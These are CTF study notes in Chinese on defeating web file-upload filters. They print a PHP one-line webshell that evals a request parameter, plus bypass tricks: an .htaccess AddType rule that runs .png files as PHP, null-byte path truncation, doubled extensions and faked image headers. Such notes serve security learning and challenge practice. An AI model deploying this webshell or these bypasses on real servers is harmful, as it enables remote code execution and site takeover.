# ctf-web- 文件上传

## 无过滤——一句话木马

``` php
<?php
    @eval($_REQUEST["shell"]);
?>
```

## 前端验证

**本质任然是一句话木马，只是修改文件后缀名为：比如图片，然后抓包，最后上传之前修改为 php**

## .htaccess

- https://www.cnblogs.com/0yst3r-2046/p/12511617.html
- https://blog.csdn.net/solitudi/article/details/116666720
- .htaccess 文件会被默认读取
- `AddType application/x-httpd-php .png` png 文件会被解析成 php 文件执行，可以编写好一句话木马，然后以 png 格式上传。

## 00 截断

- https://blog.csdn.net/luminous_you/article/details/110878989
- https://www.cnblogs.com/0yst3r-2046/p/12530316.html
- 需要抓包修改具体上传路径，访问到 000. php 就可以了
- ![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240806220013.png)

## 双写后缀

顾名思义 `test. pphphp` 其中一个 php 会被过滤掉。

## 文件头修改

- 上传真 png 文件，修改后缀，添加一句话木马
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240806220849.png)
